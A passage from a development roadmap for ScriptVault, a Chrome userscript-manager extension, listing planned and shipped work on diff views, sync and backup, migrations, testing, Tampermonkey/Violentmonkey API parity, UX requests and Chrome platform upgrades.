- Use the `diff.min.js` library already in `lib/` (currently only used in offscreen document)
- Syntax-highlighted side-by-side view
- Inline conflict resolution for three-way merge during sync conflicts
- Collapsible unchanged sections (fix the one-way collapse bug)

### 7.3 Editor Undo/Redo Persistence
- Save `editor.getModel().getAlternativeVersionId()` and undo stack per tab
- Restore on tab switch instead of calling `clearHistory()`
- Global undo for destructive operations (delete, bulk actions) with toast + undo button

### 7.4 Bulk Action Safety
- [x] Confirmation dialog for bulk delete, with Trash-aware recovery copy when retention is enabled and permanent-delete copy when Trash is disabled
- "Undo" toast for 5 seconds after bulk delete (deferred actual deletion)
- Select-all checkbox in table header
- Shift-click range selection: handle filtered-out `lastCheckedId` gracefully (fall back to single-select)

**2026-04-26 note:** Bulk delete now says "Move to Trash" when recovery is available, keeps destructive copy only when Trash is disabled, and offers an "Open Trash" toast action after successful recovery-backed deletes. Deferred true undo remains open.

### 7.5 Beautify Cursor Preservation ✅ Shipped in v3.6.3
- After beautify, find the equivalent position in the new code by character offset mapping
- Or: use Monaco's built-in format document action which preserves cursor natively

**Status (v3.6.3, 2026-05-02):** Cursor + vertical scroll position preserved after beautify. Implementation uses character-offset-from-content mapping: since the beautifier only changes leading whitespace, the same logical line exists before/after, so `newCh = newLeadingWS + max(0, oldCh - oldLeadingWS)`. Cursors that sat inside the indent region snap to the start of the new line's content. Falls back to old top-of-file behaviour only when the editor adapter doesn't expose `getCursor()`.

### 7.6 Web Worker for Heavy Operations
- Move filtering, sorting, and search to a Web Worker
- Script metadata indexing in the worker
- Keeps the main thread responsive during large-collection operations

### 7.7 Command Palette Polish
- `switchTab` → make async, await `lazyInitTab` (already fixed, verify)
- Stable command index (no stale-index race on fast typing)
- Recent commands section
- Fuzzy matching

**Exit criteria:** Virtual scrolling handles 1000+ scripts, Myers diff, persistent undo, bulk delete confirmation, responsive filtering via Worker.

---

## Phase 8 — Sync & Backup Rewrite

**Goal:** Reliable cross-device sync with conflict resolution.

### 8.1 CRDT-Based Merge
- Replace last-write-wins with operation-based CRDT for script metadata
- Track per-field timestamps: `{ enabled: { value: true, timestamp: 1234 } }`
- Last-writer-wins per field, not per script (enabling on device A doesn't clobber a code edit on device B)
- For code: three-way merge using the `diff.min.js` library (already in the project)

### 8.2 Conflict UI
- When three-way merge fails (conflicting edits to the same lines):
  - Show both versions in the diff viewer
  - Let user pick per-hunk (accept left / accept right / edit manually)
  - "Accept all remote" / "Accept all local" shortcuts
- Queue conflicts for later resolution (don't block sync)

### 8.3 Sync Reliability
- Replace `setTimeout` debounce with `chrome.alarms` (survives worker termination)
- Sync state machine: `idle → checking → downloading → merging → uploading → idle`
- Persistent sync queue in `chrome.storage.session`
- Retry with exponential backoff on failure
- Sync log visible in settings (last 50 operations with timestamps and outcomes)

### 8.4 Backup Overhaul
- Store backups in IndexedDB as raw ArrayBuffer (not base64 in chrome.storage.local)
- Metadata index in `chrome.storage.local` (just id, timestamp, size, scriptCount)
- Selective restore actually works (fix the current bug where it restores everything)
- Export to File System Access API (user picks download location)
- Import from file picker

### 8.5 Token Security
- Remove fake encryption from `dashboard-gist.js` (hardcoded PBKDF2)
- Cloud tokens stored in `chrome.storage.local` (already sandboxed by Chrome)
- Document security model honestly: "tokens protected by Chrome's extension sandbox"
- Optional user passphrase for sync encryption (real key derivation from user input)

**Exit criteria:** Per-field CRDT merge, conflict UI, alarm-based sync, IndexedDB backups, honest token storage.

---

## Phase 9 — Migration System Rewrite

**Goal:** Reliable, tested data migration between versions.

### 9.1 Fix Current Migration
- Read from `userscripts` key (not `script_*` keys)
- Write back to `userscripts` key (not `script_*` keys)
- After Phase 2: migrate from `userscripts` blob to per-script IndexedDB entries

### 9.2 Migration Framework
```typescript
// src/modules/migration.ts
interface Migration {
  version: string;           // target version
  description: string;
  migrate(data: unknown): Promise<void>;
  rollback(data: unknown): Promise<void>;
  validate(data: unknown): boolean;
}

const MIGRATIONS: Migration[] = [
  { version: '2.0.0', ... },
  { version: '3.0.0', ... }, // Phase 2 IndexedDB migration
];
```
- Run migrations sequentially on version upgrade
- Each migration is independently testable
- Dry-run mode: log what would change without committing
- Rollback capability: store pre-migration snapshot
- Validation step: verify migrated data matches expected schema

### 9.3 Migration Tests
- Unit test each migration with known input → expected output
- Test migration from every historical version to current
- Test interrupted migration (simulate crash mid-migration)
- Test rollback path

**Exit criteria:** Migrations read/write correct keys, framework supports dry-run and rollback, every migration has unit tests.

---

## Phase 10 — Testing & Quality

**Goal:** Comprehensive automated testing at every level.

### 10.1 Unit Test Coverage
- Target: 80%+ line coverage for all `src/` modules
- Priority modules (by bug density):
  1. `url-matcher.ts` — every pattern type, every edge case
  2. `storage.ts` — CRUD operations, concurrent access, quota handling
  3. `parser.ts` — malformed metadata, encoding edge cases
  4. `registration.ts` — enable/disable/update flows
  5. `wrapper-builder.ts` — GM API injection correctness
  6. `migration.ts` — every migration path

### 10.2 Integration Tests
- Background + storage: full script lifecycle (install → enable → update → rollback → delete)
- Background + sync: sync round-trip (local change → upload → download on fresh profile)
- Dashboard + background: message passing contract tests (send message, verify response shape)

### 10.3 E2E Tests (Puppeteer/Playwright)
- Load extension in Chrome
- Install a script from URL
- Verify it runs on a test page
- Toggle it off, verify it stops running
- Open dashboard, verify script appears
- Edit script, save, verify changes take effect
- Store search → install → verify in scripts list
- Popup: verify badge count, quick toggle
- Side panel: verify script list matches current tab

### 10.4 Mutation Testing
- Use Stryker or similar to verify test quality
- Focus on url-matcher and storage modules
- Target: 70%+ mutation score on critical modules

### 10.5 Fuzzing
- Fuzz the userscript metadata parser with random input
- Fuzz the URL matcher with random URLs × random patterns
- Fuzz the `@require` URL resolver with adversarial inputs
- Integrate with CI as a nightly job

**Exit criteria:** 80%+ unit coverage, integration tests for critical flows, E2E suite in CI, mutation testing on critical modules.

---

## Phase 11 — GM API Parity & Platform API Catch-up

**Goal:** Close the gap between ScriptVault and Tampermonkey/Violentmonkey on GM API coverage and expose newly-available Chrome platform APIs.

### 11.1 GM_info Enrichment

Violentmonkey exposes substantially more metadata in `GM_info` than ScriptVault does. Parity targets:

- `GM_info.isIncognito` — `true` when the script is executing in an incognito context. Incognito-aware scripts currently have no portable way to detect this. Source: [VM GM_info docs](https://violentmonkey.github.io/api/gm/#gm_info).
- `GM_info.platform` — object with `arch`, `browserName`, `browserVersion`, `fullVersionList`, `mobile`, `os` sourced from `navigator.userAgentData` (available from the background SW context, not spoofable by the page). Source: [VM GM_info docs](https://violentmonkey.github.io/api/gm/#gm_info).
- `GM_info.userAgent` / `GM_info.userAgentData` — expose the SW-context strings. Pages can spoof `navigator.userAgent`; injecting from the background avoids that.
- `GM_info.script.options` — expose per-script override settings so scripts can read their own configuration.

Implementation: expose these from the background's `buildGmInfo()` function; no new permissions required.

**Status (v3.2.0, 2026-05-02):** `GM_info.isIncognito`, `GM_info.platform.{os,arch,browserName,browserVersion,fullVersionList,mobile}`, `GM_info.userAgent`, and `GM_info.userAgentData` (cloned brands/platform/mobile) all populated. browserName/browserVersion now prefer `navigator.userAgentData.brands` with the legacy UA-string regex as fallback. `GM_info.script.options` deferred — needs the merge-mode UI from 11.3 to have anything meaningful to expose.

### 11.2 `@unwrap` Metadata Tag

Violentmonkey supports `// @unwrap` to disable the auto-injected IIFE wrapper. This allows:

- ESM-style top-level `export`/`import` if the page's CSP permits
- Scripts that intentionally modify the top-level scope
- Easier porting of scripts from other contexts

Add `@unwrap` to the metadata parser; when present, emit the script code as-is rather than wrapping in `(function() { ... })()`. Log a console warning noting that `@grant` APIs are unavailable without the wrapper. Source: [VM metadata block docs](https://violentmonkey.github.io/api/metadata-block/).

**Status (v3.2.1, 2026-05-02):** Shipped. Parser already accepted `@unwrap`; wrapper-builder (`background.core.js` + TS mirror at `src/background/wrapper-builder.ts`) now skips the GM API IIFE when `meta.unwrap === true` and prepends a `console.warn` banner so the choice is visible at runtime. Install confirmation dialog surfaces `unwrapped (no GM_* APIs)` in the run-timing summary so users see it before they confirm.

### 11.3 Per-Script User-Override Merge Flags

Violentmonkey supports `// @merge_matches`, `// @merge_excludes`, `// @merge_includes`, `// @merge_connect` to let users toggle whether their local additions to those fields _replace_ or _merge with_ the script's authored values. ScriptVault already allows user overrides to match/exclude; it needs the merge/replace toggle.

- Add `userOverrideMergeMode: 'merge' | 'replace'` per field to `ScriptSettings`
- UI: dropdown per overrideable field in the script settings panel
- Default: `merge` (matches current undocumented behavior)

### 11.4 `userScripts.execute()` — One-Shot Execution

Chrome 135 added `chrome.userScripts.execute()` — inject a script into a specific tab once, on demand, without registering it for future page loads. Enables:

- "Run now" button in the dashboard (execute once without toggling the script on)
- Quick-test workflow: modify → inject into current tab without a full save
- Popup action to run a specific script against the active tab immediately

Guard with `typeof chrome.userScripts.execute === 'function'` (Chrome 135+ only). Source: [Chrome Extensions What's New](https://developer.chrome.com/docs/extensions/whats-new), [userScripts.execute() reference](https://developer.chrome.com/docs/extensions/reference/api/userScripts#method-execute).

**Status (v3.4.0, 2026-05-02):** Popup-side Run on This Tab shipped. Background `runScriptNow` handler prefers `chrome.userScripts.execute()` (USER_SCRIPT world, GM_* APIs intact) with a `chrome.scripting.executeScript({world:'MAIN'})` fallback for Chrome <135. `@require` libraries are resolved via `fetchRequireScript` so the one-shot run sees the same library set as a normal registration. Dashboard-side Run Now button still pending (the popup affordance covers the most common quick-test workflow).

### 11.5 GM_xmlhttpRequest Completeness

Two missing options discovered from competitor changelogs:

- **`noCache: true`** — add a `Cache-Control: no-cache` / `Pragma: no-cache` request header (or append a cache-buster query param for HTTP/1.0 compatibility). Maps to Violentmonkey issue [#2168](https://github.com/violentmonkey/violentmonkey/issues/2168).
- **`redirect: 'follow' | 'error' | 'manual'`** — expose the `RequestInit.redirect` option so scripts can detect or block redirects. Maps to Violentmonkey issue [#2359](https://github.com/violentmonkey/violentmonkey/issues/2359).

Both changes are localized to `modules/xhr.js` (later `src/modules/xhr.ts`). Low risk.

Additional completeness items for `GM_xmlhttpRequest`:

- **`responseType: 'stream'`** — ScriptCat exposes a streaming response type for chunked/SSE responses. Implementation via `fetch()` with a `ReadableStream` callback forwarded through the SW message channel. Source: [ScriptCat API docs](https://docs.scriptcat.org/docs/dev/api/).
- **`nocache` alias** — Tampermonkey uses `nocache` (not `noCache`); accept both casings in the parser.

**Status (v3.2.0, 2026-05-02):** `noCache` (with `nocache` alias), `redirect: 'follow'|'error'|'manual'`, and `responseType: 'stream'` all live. `XhrManager.buildFetchOptions(data)` (in `modules/xhr.js` + TS mirror) centralises the option translation and is unit-tested (9 cases — case-insensitive Cache-Control/Pragma override behavior, valid/invalid redirect values, anonymous credentials, default method).

### 11.6 `GM_cookie` API

Both Tampermonkey and ScriptCat expose `GM_cookie` for reading, writing, and deleting cookies — including HttpOnly cookies inaccessible via `document.cookie`. This is one of the highest-demand missing APIs for scripts targeting sites with strict cookie policies.

```js
// Signature to implement (Tampermonkey-compatible):
GM_cookie("list", { url, domain, name }, (cookies, error) => {});
GM_cookie("set",  { url, name, value, domain, path, secure, httpOnly, sameSite, expirationDate }, (error) => {});
GM_cookie("delete", { url, name }, (error) => {});
```

Implementation path: the background service worker has `cookies` permission; proxy calls through the SW using `chrome.cookies.getAll/set/remove`. Source: [ScriptCat GM_cookie docs](https://docs.scriptcat.org/docs/dev/api/#gm_cookie), [TM changelog](https://www.tampermonkey.net/changelog.php).

Requires adding `"cookies"` to `manifest.json` permissions and auditing whether CWS review requires additional justification.

### 11.7 Extended Metadata Directives

Several metadata directives parsed by Violentmonkey and Tampermonkey are not yet handled by ScriptVault's parser. Add parsing and behavior for:

| Directive | Manager | Behavior |
|-----------|---------|----------|
| `@inject-into page\|content\|auto` | VM | Selects `USER_SCRIPT` world (`page`) vs. `ISOLATED` world (`content`) vs. automatic fallback (`auto`). Maps directly to `world:` in `chrome.userScripts.register()`. Source: [VM metadata](https://violentmonkey.github.io/api/metadata-block/#inject-into). |
| `@connect domain` | TM | Whitelist domains that `GM_xmlhttpRequest` may contact. Parse into the script record; enforce at request time in `xhr.js`. Source: [TM docs via ScriptCat comparison](https://docs.scriptcat.org/docs/dev/api/). |
| `@tag label` | VM | Categorical labels assigned by the script author (distinct from user-assigned tags). Expose in `GM_info.script.options.tags` and in the dashboard filter sidebar. Source: [VM metadata — @tag](https://violentmonkey.github.io/api/metadata-block/). |
| `@antifeature ads\|tracking\|miner "note"` | TM, VM | Declare monetization or data collection. Show a warning banner in the install confirmation dialog when present. Source: [VM GM_info](https://violentmonkey.github.io/api/gm/#gm_info). |
| `@compatible chrome\|firefox\|...` | TM, VM | Browser compatibility hints. Display in script info panel; no enforcement needed. |
| `@top-level-await` | VM | When present, wrap the script in an async IIFE (`(async () => { ... })()`). Required for scripts using `await` at the top level. Source: [VM metadata](https://violentmonkey.github.io/api/metadata-block/#top-level-await). |
| `@run-at document-body` | VM | Fire after the `<body>` element appears (via `MutationObserver`), before `DOMContentLoaded`. Source: [VM metadata](https://violentmonkey.github.io/api/metadata-block/). |
| `@weight 1–999` | Userscripts (Safari) | Integer injection priority (higher = earlier within same `@run-at`). Useful when two scripts both run `document-start` and one must come first. Source: [Userscripts README](https://github.com/quoid/userscripts). |

Priority order: `@inject-into` and `@connect` are HIGH (security-relevant and broadly compatible); the rest are MEDIUM parity items.

**Status (rolling):**
- `@inject-into`, `@connect`, `@tag`, `@antifeature`, `@compatible`, `@incompatible`, `@top-level-await` — all parsed in `background.core.js`. `@antifeature` warning banner already lives in the install dialog.
- `@run-at document-body` — recognized by the parser; currently maps to `document_end` for `chrome.userScripts.register()` since Chrome lacks a native body-only injection point. A MutationObserver shim that fires when `<body>` appears is still the right behavior; deferred.
- **`@weight 1..999` shipped in v3.5.0 (2026-05-02).** Parser clamps to documented range; `registerAllScripts` sort uses `Math.max(priority, weight)`; `GM_info.script.weight` + `GM_info.script.priority` exposed. TS mirrors in `src/types/script.ts` + `src/background/parser.ts` matched. 5 parser tests cover valid/clamp-above/clamp-below/default/non-numeric.

### 11.8 `@require` Subresource Integrity

Tampermonkey supports SRI hashes appended to `@require` URLs:

```
// @require https://cdn.example.com/lib.js#sha256-BASE64HASH=
```

If the downloaded content's hash does not match, the `@require` resource must be rejected and an error surfaced in the install dialog. This closes a supply-chain attack vector where a CDN serves silently-modified code.

Implementation: after fetching the `@require` URL, extract the fragment (`#sha256-` / `#sha384-` / `#sha512-`), compute the hash of the downloaded bytes via `crypto.subtle.digest()`, and compare. Source: [GitHub Advisory Database — userscript supply chain risk](https://github.com/advisories?query=userscript), [TM docs](https://www.tampermonkey.net/changelog.php).

### 11.9 `GM_getTab` / `GM_saveTab` / `GM_getTabs`

Tab-scoped transient storage: attach arbitrary data to the current tab's lifetime. `GM_getTabs` returns data from all tabs running scripts from this extension. Present in Tampermonkey, ScriptCat, and Userscripts (Safari).

Implementation: store in `chrome.storage.session` keyed by `tabId` (in-memory, cleared on tab close/browser restart). Source: [ScriptCat API](https://docs.scriptcat.org/docs/dev/api/#gm_getsavetabgm_gettabs), [Userscripts README](https://github.com/quoid/userscripts).

### 11.10 `@run-at navigation` — SPA Re-execution

Single-page applications that use `history.pushState` do not trigger standard document lifecycle events, so `document-start`/`document-end` scripts run only on the initial page load. This is the most persistent user complaint in community threads.

Implementation options:
1. Background SW listens for `chrome.webNavigation.onHistoryStateUpdated` and calls `userScripts.execute()` (Chrome 135+) to re-inject the script.
2. Or: inject a lightweight `popstate`/Navigation-API observer shim alongside the script that calls back to the SW on each navigation event.

Parse `// @run-at navigation` in the metadata block as a trigger mode distinct from the existing `run-at` values. Scripts with this directive still run on `document-end` for the initial page load; the navigation trigger handles subsequent client-side navigations.

Source: VM issue [#2048](https://github.com/violentmonkey/violentmonkey/issues/2048), Chrome Navigation API (shipped Chrome 102).

### 11.11 `GM_notification` Enhancements

ScriptCat's `GM_notification` implementation extends the standard:

- `progress: 0–100` — show a progress bar within the notification (useful for download scripts).
- `buttons: [{title, iconUrl}]` up to 2 — clickable action buttons in the notification; `onclick(e)` receives `e.buttonClickIndex`.
- `GM_updateNotification(notificationId, details)` — update the text/progress of an existing notification without closing it.
- `GM_closeNotification(notificationId)` — programmatically close a notification.

Chrome's `chrome.notifications` API supports all of these natively via `progressType: 'progressbar'`, `buttons[]`, `update()`, and `clear()`. Source: [ScriptCat notification API](https://docs.scriptcat.org/docs/dev/api/#gm_notification-).

**Status (v3.3.0, 2026-05-02):** Shipped. `progress` (0..100) and `buttons[]` (capped at 2 per Chrome) are accepted by `GM_notification`. New top-level `GM_updateNotification(id, details)` and `GM_closeNotification(id)` functions exposed on `window`. `GM_notification(...)` now also returns a control object `{ close(), update(patch) }` so authors don't have to keep tags around manually. `chrome.notifications.onButtonClicked` routes the index back to the originating tab; the wrapper fires `onbuttonclick({ buttonClickIndex })`. `content.js` bridge forwards `buttonIndex`; linter `KNOWN_GM_APIS` learned the new function names.

**2026-05-17 note (Round 12):** Chrome [Notification Triggers API](https://developer.chrome.com/docs/web-platform/notification-triggers) is **officially discontinued** — explicitly do NOT plan against it in any future iteration. Tracked in Phase 39.47 to prevent resurfacing in planning.

**Exit criteria:** `GM_info.isIncognito` and `GM_info.platform` populated; `@unwrap` parses and emits correctly; merge-mode UI exists; "Run now" button uses `userScripts.execute()` on Chrome 135+; `GM_xmlhttpRequest` accepts `noCache`/`nocache`, `redirect`, and `responseType: 'stream'`; `GM_cookie` proxied through SW; `@inject-into`, `@connect`, `@tag`, `@antifeature`, `@top-level-await`, `@run-at document-body`, `@weight` all parsed; `@require` SRI validated; `GM_getTab`/`GM_saveTab`/`GM_getTabs` stored in `storage.session`; `@run-at navigation` fires on SPA route changes; `GM_notification` supports progress, buttons, update, close.

---

## Phase 12 — UX Polish & High-Signal Community Requests

**Goal:** Address the most-upvoted feature requests from Tampermonkey and Violentmonkey issue trackers that apply cleanly to ScriptVault's design philosophy.

Sources: TM issues [#2748](https://github.com/Tampermonkey/tampermonkey/issues/2748), [#2722](https://github.com/Tampermonkey/tampermonkey/issues/2722), [#2624](https://github.com/Tampermonkey/tampermonkey/issues/2624), [#2458](https://github.com/Tampermonkey/tampermonkey/issues/2458), [#2442](https://github.com/Tampermonkey/tampermonkey/issues/2442), [#2579](https://github.com/Tampermonkey/tampermonkey/issues/2579); VM issues [#2464](https://github.com/violentmonkey/violentmonkey/issues/2464), [#2287](https://github.com/violentmonkey/violentmonkey/issues/2287), [#2219](https://github.com/violentmonkey/violentmonkey/issues/2219), [#2169](https://github.com/violentmonkey/violentmonkey/issues/2169).

### 12.1 Script Profiles (Groups)

A **profile** is a named set of scripts with independent per-script enable/disable state. Toggling a profile enables or disables all its members in one action without losing the per-script state within the profile.

- Data model: `Profile { id, name, scriptStates: Map<scriptId, enabled> }`; stored in `chrome.storage.local` alongside the script index
- UI: profile selector in the popup toolbar and dashboard header; "Active profile" shown in the extension badge tooltip
- Profile edit modal: add/remove scripts, rename, duplicate, delete
- "Global" is the default profile (current behavior)

This supersedes simple tag-based enable/disable without touching the tag system.

### 12.2 Improved Script Search

Current search is substring-based. Users with 100+ scripts struggle to find scripts by partial or out-of-order words (VM issue [#2464](https://github.com/violentmonkey/violentmonkey/issues/2464)).

- Replace exact-match with fuzzy match (Levenshtein distance or prefix-weighted scoring)
- Search fields: name, namespace, description, `@match` patterns
- Highlight matched substrings in results
- Sort by relevance score when a search query is active, not alphabetical
- The Web Worker from Phase 7.6 hosts the search index; no main-thread blocking

### 12.3 Enabled-But-Not-Executed Visual Distinction

Tampermonkey distinguishes between scripts that are **enabled** vs. scripts that **executed on the current page**. ScriptVault's sidepanel shows active scripts but doesn't make this distinction.

- In the sidepanel and popup list: green dot = executed on this tab, grey dot = enabled but not matching/ran
- Add an "executed" counter to the badge (separate from "installed") or use the existing badge just for executed count
- Helps users diagnose why a script "isn't running" without opening the dashboard

### 12.4 Script List Grouping and Folding

VM issue [#2287](https://github.com/violentmonkey/violentmonkey/issues/2287). Group scripts in the dashboard list by tag (or profile, once 12.1 lands) with collapsible sections:

- Collapsible tag-groups in the installed scripts table
- Collapsed state persisted per session
- Drag-sort still works within and across groups (drop on a group header to assign tag)
- "Ungroup" view available

### 12.5 Popup Menu Command Collapse

VM issue [#2219](https://github.com/violentmonkey/violentmonkey/issues/2219). When many scripts register menu commands via `GM_registerMenuCommand`, the popup becomes unwieldy. Fix:

- Scripts with multiple registered commands collapse into a sub-section in the popup
- Expand on click
- Single-command scripts stay flat (no nesting needed)

### 12.6 Mass Export / Selective Export

VM issue [#2169](https://github.com/violentmonkey/violentmonkey/issues/2169). Current backup exports all scripts or one script. Add:

- Checkbox multi-select in the dashboard script list
- "Export selected" button: generates a ZIP containing only selected scripts
- Individual-script export (already partially exists — make it consistent and discoverable)
- Round-trip format compatibility with Tampermonkey's ZIP export

### 12.7 Bulk Pattern Editing

TM issue [#2442](https://github.com/Tampermonkey/tampermonkey/issues/2442). Allow multi-selecting scripts and adding a shared `@exclude` or `@exclude-match` pattern to all of them at once:

- "Add exclude" action in the multi-select toolbar
- Text input for the new pattern
- Preview which scripts already match the exclude before committing
- Undo via the standard 5-second deferred-commit toast (from Phase 7.4)

### 12.8 Tag Preservation on Reinstall + "Untagged" Filter

TM issue [#2624](https://github.com/Tampermonkey/tampermonkey/issues/2624). Currently reinstalling a script via its install page resets all user-assigned tags.

- On reinstall: detect existing script by namespace+name match; merge user-side fields (tags, enabled state, settings) with new code/metadata from the update
- "Untagged" as a virtual filter option in the tag sidebar (shows all scripts with no tags assigned)

### 12.9 Install from Local File ✅ Shipped in v3.8.0

TM issue [#2722](https://github.com/Tampermonkey/tampermonkey/issues/2722). Allow drag-and-drop or file-picker install of a `.user.js` file without going through a URL:

- File input in the dashboard toolbar (`<input type="file" accept=".user.js,.js">`)
- Parse the file as a userscript; show the normal install confirmation dialog
- Drag-and-drop `.user.js` onto the dashboard also triggers install
- Does not require any new permissions (`chrome.userScripts` registration is already handled)

**Status (v3.8.0, 2026-05-02):** Shipped. New "Install from Local File" section in the dashboard Import tab with a hidden file input and a "Choose file…" button; status pill reports the chosen file's name and install result. Window-wide drag/drop overlay accepts one or many `.user.js` files at once and installs them serially with a single batch toast. Background gained `installFromCode(code)` (TS + JS) and a matching `installFromCode` message handler; `installFromUrl` now reuses it after fetching the URL so both paths share parse/size/dedupe/register logic. Multi-file drop reuses the same handler; per-file size cap matches the URL path (5MB).

### 12.10 In-App Update Notifications

TM issue [#2748](https://github.com/Tampermonkey/tampermonkey/issues/2748) and [#2458](https://github.com/Tampermonkey/tampermonkey/issues/2458). Users find OS notification spam for update checks annoying. Replace:

- Remove all `chrome.notifications.create()` calls for routine update check results (no-update, pending)
- Instead: badge a yellow indicator on the extension icon when updates are available
- Dashboard shows an "Updates available" banner that lists pending updates
- Only use OS notifications for: install errors, sync failures, and security warnings (new `@connect` domain added)

**Status (v3.7.0, 2026-05-02):** Mostly shipped. `applyUpdate` no longer fires a per-script OS notification — `autoUpdate` aggregates cycle results into a single summary notification ("3 scripts updated: A v1.0 → v1.1, B v2.0 → v2.1, ..."), still gated by `notifyOnUpdate`. New `UpdateSystem._recentUpdates` ring buffer + `getRecentUpdates`/`clearRecentUpdates` background handlers feed a dismissible dashboard banner that lists scripts auto-updated since the last visit. Yellow-badge indicator for "updates available" still pending — can land alongside Phase 6.2 (staged updates) when those land.

### 12.11 Per-Site Enable/Disable Toggle

VM issue [#2410](https://github.com/violentmonkey/violentmonkey/issues/2410). Allow enabling or disabling a script for only the current domain without globally disabling it or editing `@match`. No other manager has this; it fills the gap between "script off everywhere" and "script on everywhere."

- Data model: `ScriptSettings.siteOverrides: { [origin: string]: boolean }` — values override the script's global enabled state for that origin only
- UI: in the popup script list, long-press or right-click on a script row shows "Disable only for this site" / "Enable only for this site"
- Badge shows site-specific count separately from global count
- Does not affect `@match` rules — purely a runtime override at injection decision time

### 12.12 Runtime Permission Diagnostics

VM issue [#2263](https://github.com/violentmonkey/violentmonkey/issues/2263). When `GM_download` or `GM_xmlhttpRequest` fails silently (Chrome blocks the request due to missing host permissions), the user sees an empty error object. Fix:

- On `GM_xmlhttpRequest` error: check whether the target URL's origin has host permission (`chrome.permissions.contains`)
- If no permission: surface a diagnostic toast: _"Request to example.com was blocked. ScriptVault does not have host permission for this domain. [Grant permission]"_
- The "Grant permission" button triggers `chrome.permissions.request({origins: ['https://example.com/*']})` via `chrome.permissions.addHostAccessRequest()` (Chrome 132+) or a fallback dialog
- Log the diagnostic to the script's execution log (Phase 7.5 log panel)

Source: VM issue [#2263](https://github.com/violentmonkey/violentmonkey/issues/2263), [chrome.permissions.addHostAccessRequest() — Chrome 132](https://developer.chrome.com/docs/extensions/whats-new).

### 12.13 Script Recycle Bin (Undo Delete)

VM issue [#2144](https://github.com/violentmonkey/violentmonkey/issues/2144). When a script is deleted or overwritten via reinstall, save the previous version to a soft-delete bin before permanent removal.

- Soft-delete: move to `scripts_trash` IndexedDB store (Phase 2) with a `deletedAt` timestamp; keep for 30 days or until manually purged
- Dashboard "Trash" section (collapsible, greyed out): shows deleted scripts with "Restore" and "Permanently delete" actions
- On script update/reinstall: write the old version to trash before writing the new version
- "Undo" toast after delete: 8-second window; clicking Undo restores from trash immediately

### 12.14 vscode.dev Integration

TM has a companion extension ([Tampermonkey Editors](https://github.com/Tampermonkey/tampermonkey-editors)) that exposes a `chrome.runtime.onMessageExternal` interface so vscode.dev can open and save scripts directly. Implement the same pattern:

- Add a `"externally_connectable"` manifest entry listing vscode.dev as a permitted external connection
- Expose: `getScript(id)`, `listScripts()`, `saveScript(id, code)`, `createScript(metadata, code)` via `onMessageExternal`
- Publish a companion VS Code extension that: connects to ScriptVault, opens scripts as virtual workspace files, auto-saves on `onDidSaveTextDocument`
- VS Code extension ID registered in `externally_connectable.ids`

Source: [Tampermonkey/tampermonkey-editors](https://github.com/Tampermonkey/tampermonkey-editors), VM issue [#1994](https://github.com/violentmonkey/violentmonkey/issues/1994).

### 12.15 `@storageName` — Cross-Script Storage Sharing

ScriptCat allows multiple scripts to share a `GM_setValue`/`GM_getValue` storage namespace by declaring the same `@storageName` in their metadata. Useful for utility scripts that expose a shared data layer.

- Parse `// @storageName <name>` in the metadata block
- When present, use `storageName` as the storage key prefix instead of the script's internal ID
- Security: only scripts with the same `@storageName` can share the bucket; no cross-namespace leakage

Source: [ScriptCat API docs — @storageName](https://docs.scriptcat.org/docs/dev/meta/#storagename).

### 12.16 Script Browser (GreasyFork/OpenUserJS)

VM issue [#2425](https://github.com/violentmonkey/violentmonkey/issues/2425). Complement the existing "Publish to GreasyFork" button (Phase 13.8) with an in-manager script discovery view:

- New "Browse" tab in the dashboard using the GreasyFork JSON API (`greasyfork.org/scripts.json?q=&sort=daily_installs`)
- Display: script name, description, install count, last updated, compatibility badges
- "Install" button: fetches the `.user.js` URL and runs through the normal install dialog
- Search: proxied through `GM_xmlhttpRequest` → background SW to avoid CORS restrictions
- Paginated; no caching needed (network request on open)

Source: [GreasyFork API docs](https://greasyfork.org/en/help/api), VM issue [#2425](https://github.com/violentmonkey/violentmonkey/issues/2425).

**Exit criteria:** Profiles work end-to-end; fuzzy search live in dashboard; executed/enabled distinction visible; list groups collapse; popup commands fold; mass export works; bulk exclude add works; tags preserved on reinstall; local file install works; no OS notifications for routine update checks; per-site enable/disable toggle works; runtime permission diagnostics surface actionable hints; trash bin restores deleted scripts; vscode.dev companion extension connects and saves; `@storageName` storage sharing works; GreasyFork script browser loads and installs scripts.

---

## Phase 13 — Platform Modernization

**Goal:** Adopt Chrome APIs that have matured since v2.x, upgrade key dependencies, and prepare the extension for the next two years of the Chrome platform.

### 13.1 Chrome 148 Structured Clone Messaging

Chrome 148 adds opt-in structured clone serialization for extension messaging, replacing JSON. This enables passing `Map`, `Set`, `BigInt`, `Date`, `Error`, `File`, and `Blob` objects without manual serialization. Source: [Chrome Extensions blog, April 2026](https://developer.chrome.com/blog/structured-clone-messaging).

- Add `"message_serialization": "structured_clone"` to `manifest.json` (requires Chrome 148)
- Guard with version check: only opt in if `Number(navigator.userAgent.match(/Chrome\/(\d+)/)?.[1]) >= 148`
- After TypeScript migration (Phase 1.6): replace `Map<k,v>` → JSON-array workarounds in message passing with direct `Map` usage
- Test: verify backward-compat with Chrome < 148 (falls back to JSON automatically)
- Note: native messaging channels are unaffected (always JSON)

### 13.2 `sidePanel.getLayout()` for RTL Support

Chrome 140 added `chrome.sidePanel.getLayout()` to detect whether the panel is docked left or right. Source: [Chrome Extensions What's New](https://developer.chrome.com/docs/extensions/whats-new).

- Use the panel position to flip the content's internal layout for better visual alignment
- Necessary groundwork for RTL locale support (Phase 14.6)

### 13.3 Chrome 138 "Allow User Scripts" Onboarding Update

Chrome 138 replaced the global Developer Mode requirement with a per-extension "Allow User Scripts" toggle. This changes the onboarding experience for new users. Source: [Chrome blog: chrome.userScripts is changing](https://developer.chrome.com/blog/chrome-userscript).

- Update `onboarding.html` (if it exists) and the install README instructions
- The `isUserScriptsAvailable()` detection function already handles both versions (try/catch approach)
- Ensure `background.js` has the Chrome 138 version-gated check:
  ```js
  const ver = Number(navigator.userAgent.match(/Chrome\/(\d+)/)?.[1]);
  if (ver >= 138) { /* link to per-extension toggle */ }
  else { /* link to developer mode */ }
  ```
- Update CWS description to reference the new toggle path

### 13.4 Monaco Upgrade: 0.52 → 0.55.x

Monaco 0.52 is the pinned version. Monaco 0.55.x adds:
- **Native LSP support** (`lsp` namespace) — enables real-time type-checking, go-to-definition, and hover docs for the userscript editor if a language server is available
- **AMD build deprecated** (0.53.0) — the AMD module format is no longer supported; ScriptVault must verify it does not load Monaco via AMD. The ESM/bundled path (via esbuild) is fine.
- **Namespace refactoring** (0.55.0 breaking) — `languages.css/html/json/typescript` moved to top-level `css/html/json/typescript` — update any import paths if used.

